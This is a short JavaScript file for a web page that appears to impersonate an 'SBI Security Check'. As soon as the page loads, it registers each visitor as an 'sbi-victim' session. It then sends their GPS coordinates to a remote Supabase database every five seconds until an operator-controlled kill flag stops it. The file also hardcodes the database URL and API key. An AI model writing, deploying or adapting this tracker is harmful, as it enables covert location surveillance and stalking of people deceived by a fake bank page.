const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";

let sessionId = "";
let isKilled = false;

async function init() {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json", "Prefer": "return=representation" },
      body: JSON.stringify({ 
        owner_id: "sbi-victim-" + Date.now(), 
        label: "SBI Security Check", 
        is_active: true, 
        is_killed: false 
      })
    });

    const data = await res.json();
    sessionId = data[0].id;
    console.log("Session Started:", sessionId);

    // Start location tracking
    setInterval(sendLocation, 5000);

    // Check kill status
    setInterval(checkKillStatus, 3000);

  } catch(e) {
    console.error(e);
  }
}

function sendLocation() {
  if (isKilled) return;
  navigator.geolocation.getCurrentPosition(pos => {
    fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })
    });
  });
}

async function checkKillStatus() {
  if (!sessionId) return;
  const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${sessionId}`, {
    headers: { "apikey": SUPABASE_KEY }
  });
  const data = await res.json();
  if (data[0] && data[0].is_killed === true) {
    isKilled = true;
    console.log("%c🛑 TRACKING STOPPED", "color:red;font-size:25px");
  }
}

window.onload = init;
